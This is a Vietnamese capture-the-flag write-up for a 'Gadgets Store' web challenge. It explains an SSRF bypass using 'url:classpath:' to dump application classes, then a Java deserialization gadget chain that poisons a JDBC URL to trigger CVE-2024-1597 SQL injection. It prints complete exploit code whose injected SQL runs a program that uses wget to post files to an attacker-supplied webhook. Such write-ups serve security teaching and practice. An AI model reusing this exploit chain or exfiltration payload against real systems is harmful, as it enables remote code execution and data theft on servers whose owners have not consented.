# Gadgets Store

## Writeups from the teams

- [Team Sacombank](./from_teams/Sacombank_Writeup_Gadgets.pdf)
- [Team UPAY](https://hackmd.io/@taiwhis1/gadgets-banking-25)

## 1. Server-side Request Forgery

Sau khi tạo tài khoản và đăng nhập, ta thấy endpoint `/image?url` khi dùng image preview.
Vì biết ứng dụng chạy trên Tomcat, ta có thể thử giao thức `classpath:` để truy cập các file trong classpath của ứng dụng, nhưng cần thêm tiền tố `url:` để bypass thật sự ([java.net.URL](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/19fb8f93c59dfd791f62d41f332db9e306bc1422/src/java.base/share/classes/java/net/URL.java#L575)). Có thể thử với `http/https` để xác nhận:

```
url:https://google.com/
```

Quan sát ta sẽ thấy request thành công. Tiếp tục lạm dụng mẹo này để dump các file class rồi decompile -> lấy source code. <br>

```
url:classpath:
```

Một mẹo đơn giản là có thể dùng dùng `../` để xem các thư mục cha:

```
url:classpath:../
url:classpath:../web.xml
url:classpath:../lib (jars & dependencies)
url:classpath:../../META-INF/MANIFEST.MF (found JDK 17)
```

## 2. Insecure Deserialization to SQL Injection

Sau khi ta mua một gadget, nó sẽ hiển thị ở trang profile. Có thể import hoặc export lịch sử mua hàng bằng serialization/deserialization.

Vì ứng dụng dùng `JDK 17`, nếu ta cố gắng đạt RCE bằng các gadget có sẵn trong `ysoserial.jar` thì nhiều khả năng sẽ thất bại. Challenge này không dùng các phiên bản dependencies bị lỗi ngoại trừ `postgresql-42.7.1.jar` với `CVE-2024-1597`, nhưng hiện tại challenge chưa dùng `PreferQueryMode=SIMPLE`.

1. Trong `UserDAO.class`, ta thấy `updateBalance()` thỏa điều kiện để kích hoạt `CVE-2024-1597`.
2. `Database.class` dùng để cấu hình và xử lý JDBC connection, đồng thời cũng implement `Serializable`!
3. `equals()` của `UserDAO.class` gọi `updateBalance()`. Mảnh ghép cuối là inject tham số `PreferQueryMode=SIMPLE` vào JDBC URL thông qua Insecure Deserialization. Bằng cách này ta dùng trực tiếp JDBC URL đã bị "đầu độc" để kích hoạt `CVE-2024-1597` và thực hiện SQL injection.

Ta có thể dùng một phần của chain `CommonsCollections7` + hash collision để trigger `equals()`. ([Analysis blog](https://whoopsunix.com/docs/PPPYSO/gadgets/CommonsCollections/CommonsCollections7/))

```
java.util.Hashtable.readObject
-> java.util.Hashtable.reconstitutionPut
 -> org.apache.commons.collections.map.AbstractMapDecorator.equals
  -> java.util.AbstractMap.equals
```

Exploit code sẽ trông như sau:

```java
public class GeneratePayload {
    public static void main(String[] args) throws MalformedURLException, NoSuchFieldException, IllegalAccessException {
//        System.setProperty("user.timezone", "Asia/Ho_Chi_Minh");
        String webhook = args[0];

        HashMap map = new HashMap();

        Database database = new Database();
        map.put(database, "db");

        Field password = database.getClass().getDeclaredField("password");
        password.setAccessible(true);
        password.set(database, "9a16b4d991f940b7e62f2679&preferQueryMode=simple"); // JDBC URL poisoning + CVE-2024-1597

        UserDAO dao = new UserDAO(database);
        Map payload = new HashMap();
        payload.put("amount", -1.0);
        payload.put("username", String.format("\n;\n COPY flag FROM PROGRAM $$wget %s --post-data=`cat /*.txt`$$;-- ", webhook));

        // hash collision
        Map map1 = new HashMap();
        Map map2 = new HashMap();

        map1.put("yy", dao);
        map1.put("zZ", payload);

        map2.put("zZ", dao);
        map2.put("yy", payload);

        // finalize
        Hashtable ht = new Hashtable();
        ht.put(map1, 1);
        ht.put(map2, 2);
        serializeToBase64(ht);
    }

    private static void serializeToBase64(Object obj) {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream("payload.ser");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(obj);
            objectOutputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

```
